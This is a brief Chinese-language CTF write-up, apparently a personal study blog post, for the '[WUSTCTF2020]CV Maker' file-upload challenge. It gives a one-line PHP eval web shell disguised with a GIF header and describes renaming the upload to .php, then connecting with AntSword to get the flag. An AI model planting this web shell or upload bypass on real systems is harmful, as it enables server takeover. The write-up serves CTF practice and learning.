---
title: '[WUSTCTF2020]CV Maker'
date: 2024-06-08 17:03:37
tags: 文件上传
categories: 刷题笔记
---

### [WUSTCTF2020]CV Maker（文件上传）

首先打开页面，他要我们注册账号，那我们先注册一个

![image-20240602204444965](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022044717.png)

注册成功后我们进行登录

<!-- more -->

![image-20240602204515735](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022045426.png)

发现有个头像可以进行上传，我们可以想到文件上传的知识点

我们写一个一句话木马

```
GIF89
<?php eval($_POST[1]); ?>
```

以jpg形式上传上去，同时进行抓包

我们修改后缀为php

![image-20240602204628371](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022046529.png)

在页面源码里找到上传路径

我们使用蚁剑来连接

![image-20240602204825518](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022048578.png)

最后在根目录找到flag

![image-20240602204716988](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022047020.png)
